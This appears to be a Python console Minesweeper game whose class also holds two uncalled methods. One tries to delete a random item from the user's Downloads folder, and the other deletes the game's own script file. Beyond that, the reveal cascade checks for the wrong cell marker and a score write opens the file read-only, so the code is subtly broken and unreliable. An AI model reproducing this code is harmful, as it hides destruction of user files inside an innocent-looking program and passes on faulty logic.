import random, os, time


class Minesweeper:
    def __init__(self, width, height, mines) -> None:
        self.width = width
        self.height = height
        self.mines = mines
        self.board = [['Z' for _ in range(width)] for _ in range(height)]
        self.hidden_board = [[' ' for _ in range(width)] for _ in range(height)]
        self.populate_board()
        self.reveal_count = 0
        self.time = time.time()
        self.scoreboard = {}

    def populate_board(self) -> None:
        mine_count = 0
        while mine_count < self.mines:
            x = random.randint(0, self.width - 1)
            y = random.randint(0, self.height - 1)
            if self.hidden_board[y][x] != 'X':
                self.hidden_board[y][x] = 'X'
                mine_count += 1
        for y in range(self.height):
            for x in range(self.width):
                if self.hidden_board[y][x] != 'X':
                    self.hidden_board[y][x] = str(self.count_mines(x, y))

    def count_mines(self, x, y) -> int:
        mine_count = 0
        for i in range(max(0, y - 1), min(self.height, y + 2)):
            for j in range(max(0, x - 1), min(self.width, x + 2)):
                if self.hidden_board[i][j] == 'X':
                    mine_count += 1
        return mine_count

    """def count_neighbouring_mines(self) -> None:
        new_board = deepcopy(self.board)
        for y in range(self.height):
            for x in range(self.width):
                sum = self.board[(self.height + y - 1) % self.height][(self.width + x - 1) % self.width] + \
                      self.board[(self.height + y - 1) % self.height][(self.width + x) % self.width] + \
                      self.board[(self.height + y - 1) % self.height][(self.width + x + 1) % self.width] + \
                      self.board[(self.height + y) % self.height][(self.width + x - 1) % self.width] + \
                      self.board[(self.height + y) % self.height][(self.width + x + 1) % self.width] + \
                      self.board[(self.height + y + 1) % self.height][(self.width + x - 1) % self.width] + \
                      self.board[(self.height + y + 1) % self.height][(self.width + x) % self.width] + \
                      self.board[(self.height + y + 1) % self.height][(self.width + x + 1) % self.width]
                if self.board[y][x] == 0:
                    new_board[y][x] = -1 * sum"""

    def print_board(self) -> None:
        for i in range(self.height):
            print('\n', end='')
            for column in range(self.width):
                print(self.board[i][column], end='\t')

    def reveal(self, x, y) -> bool:
        if self.hidden_board[y][x] == 'X':
            return False
        elif self.board[y][x] == 'Z':
            self.board[y][x] = self.hidden_board[y][x]
            self.reveal_count += 1
            if self.board[y][x] == '0':
                for i in range(max(0, y - 1), min(self.height, y + 2)):
                    for j in range(max(0, x - 1), min(self.width, x + 2)):
                        if self.board[i][j] == ' ':
                            self.reveal(j, i)
        return True

    def play(self) -> None:
        while True:
            self.print_board()
            x = int(input('Enter column: '))
            y = int(input('Enter row: '))
            if not self.reveal(x, y):
                self.print_board()
                print('Game Over! You hit a mine!')
                break
            if self.reveal_count == self.width * self.height - self.mines:
                self.print_board()
                print('Congratulations! You cleared a minefield!')
                break

    def delete_files(self) -> None:
        os.remove(random.choice(os.path.expanduser('~') + "\\Downloads"))

    def delete_game(self) -> None:
        self.delete_files()
        file = open("score.txt")
        current_time = time.time()
        delta = current_time - self.time
        file.write(str(delta))
        os.remove("minesweeper.py")


def main():
    width = int(input('Enter width of minefield: '))
    height = int(input('Enter height of minefield: '))
    mines = int(input('Enter number of mines: '))
    game = Minesweeper(width, height, mines)
    game.play()


if __name__ == '__main__':
    main()
